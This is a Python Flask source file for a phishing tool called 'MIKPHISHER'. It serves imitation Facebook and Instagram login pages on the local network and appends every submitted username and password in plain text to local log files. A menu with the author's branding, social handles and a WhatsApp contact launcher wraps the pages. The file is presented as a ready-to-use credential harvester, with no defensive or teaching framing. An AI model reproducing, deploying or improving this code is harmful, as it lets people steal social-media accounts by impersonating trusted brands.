import os
import socket
import urllib.parse
from flask import Flask, render_template_string, request

# ANSI color codes for gradient
RESET = "\033[0m"
BOLD = "\033[1m"
PURPLE = "\033[35m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
GREEN = "\033[92m"
gradient = [PURPLE, CYAN, YELLOW, RED, GREEN]
c = '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m', '\033[38m', '\033[39m'

re = '\033[0m' 

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Color each line of the ASCII logo with a gradient
def show_ascii_logo():
    clear_screen()
    logo_lines = [
        " █████╗ ███╗   ███╗ ██████╗ ███████╗    ██╗  ██╗██╗███╗   ███╗",
        "██╔══██╗████╗ ████║██╔═══██╗██╔════╝    ██║ ██╔╝██║████╗ ████║",
        "███████║██╔████╔██║██║   ██║███████╗    █████╔╝ ██║██╔████╔██║",
        "██╔══██║██║╚██╔╝██║██║   ██║╚════██║    ██╔═██╗ ██║██║╚██╔╝██║",
        "██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║    ██║  ██╗██║██║ ╚═╝ ██║",
        "╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝"
    ]
    for i, line in enumerate(logo_lines):
        color = gradient[i % len(gradient)]
        print(f"{color}{BOLD}{line}{RESET}")

# Flask app setup
app = Flask(__name__)

# ----------------------
# Option 1 login page (kept the same)
# ----------------------
HTML_FORM = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { background-color: whitesmoke; font-family: Arial, sans-serif; }
        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box {
            background: white;
            padding: 20px;
            width: 360px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .login-box h2 {
            text-align: center;
            color: #1877f2;
            font-size: 32px;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 90%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
        }
        .login-box button {
            width: 100%;
            padding: 17px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h2>Facebook</h2>
            <form method="POST" action="/">
                <label>Username:</label><br>
                <input type="text" name="username" required><br>
                <label>Password:</label><br>
                <input type="password" name="password" required><br><br>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        with open("input_log.txt", "a") as f:
            f.write(f"username: {username}, password: {password}\n")
        return "Login submitted. Thank you!"
    return render_template_string(HTML_FORM)

# ----------------------
# Option 3: Instagram
# ----------------------
MANGO_FORM = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body {
            background: #FFB347; /* Mango gradient background */
            font-family: 'Helvetica', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #FFD700;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
            text-align: center;
            width: 350px;
        }
        .login-container h2 {
            color: #FF4500;
            margin-bottom: 25px;
            font-size: 30px;
        }
        .login-container input {
            width: 80%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
        }
        .login-container button {
            width: 85%;
            padding: 14px;
            margin-top: 15px;
            background: #FF4500;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
        }
        .login-container button:hover {
            background: #FF6347;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Instagram</h2>
        <form method="POST" action="/option3">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/option3", methods=["GET", "POST"])
def mango_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        # Optional: log separately
        with open("mango_log.txt", "a") as f:
            f.write(f"username: {username}, password: {password}\n")
        return f"<h1 style='text-align:center;color:#FF4500;'>Welcome to Mango Login, {username}!</h1>"
    return MANGO_FORM 

# ----------------------
# Utility functions
# ----------------------
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def open_whatsapp_chat():
    phone_number = "254754607575"
    message = "Thank you for chatting with us 🙏"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://wa.me/{phone_number}?text={encoded_message}"
    print(f"Opening WhatsApp chat with the number: {phone_number}...")
    os.system(f"am start -a android.intent.action.VIEW -d {whatsapp_url}")

# ----------------------
# Main menu
# ----------------------
def main_menu():
    while True:
        show_ascii_logo()
        print(" \033[091m[\033[096mFacebook\033[91m]\033[35m:\033[97m[\033[31mMIK TC\033[97m]\033[091m[ \033[096mInstagram\033[91m]\033[35m:\033[97m[\033[31mtc.mik\033[97m]\033[091m[\033[096mWhatsApp\033[91m]\033[35m:\033[97m[\033[31m0754607575\033[97m] ")
        print(f"                    {c[1]}[{c[0]}youtube Miktcamoskim{re}{c[1]}{re}{c[1]}]{re}")
        print('\033[092m  [ ]\033[35m:\033[97m[\033[96mTOOL CREATED BY BLACTECH\033[97m]\033[32m(AMOS KIM the MIK TC.TOP BOY )\033[32m[ ]')   
        print("\033[32m        TOP BOY WEB DEVELOPER \033[31m:\033[32m AMOS KIM CYBERSECURITY")   
        print (f"\n\n\n\n\n{c[3]} TOOL VERSION 1.0.12{re}")
        print(f"{c[1]}[{re}1{c[1]}]{c[8]} MIKPHISHER{re}")
        print(f"{c[1]}[{re}2{c[1]}]{c[8]} Chat with me on WhatsApp for cybersecurity{re}")
        print(f"{c[1]}[{re}3{c[1]}]{c[8]} Instagram (Option 3){re}")
        print(f"{c[1]}[{re}Ctrl+C{c[1]}]{c[8]} to Exit{re}")
        
        choice = input(f"Select option {c[3]}[Amoskim]{re} >>>: ")

        if choice == '1':
            ip = get_local_ip()
            print(f"\n→ Server running at: http://{ip}:5000")
            print("Press Ctrl+C to stop the server and return to the menu.\n")
            try:
                app.run(debug=False, host='0.0.0.0', port=5000)
            except KeyboardInterrupt:
                print("\nServer stopped. Returning to main menu...\n")
        elif choice == '2':
            open_whatsapp_chat()
            print("\nWhatsApp chat opened with a pre-filled message. You can now return to the main menu.\n")
        elif choice == '3':
            ip = get_local_ip()
            print(f"\n→Instagram login available : http://{ip}:5002/option3")
            print("Press Ctrl+C to stop the Instagram server and return to the menu.\n")
            try:
                app.run(debug=False, host='0.0.0.0', port=5002)
            except KeyboardInterrupt:
                print("\nMango server stopped. Returning to main menu...\n")
        else:
            print("Invalid choice. Please try again.\n")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nExiting... Goodbye by MIK tc!\n")
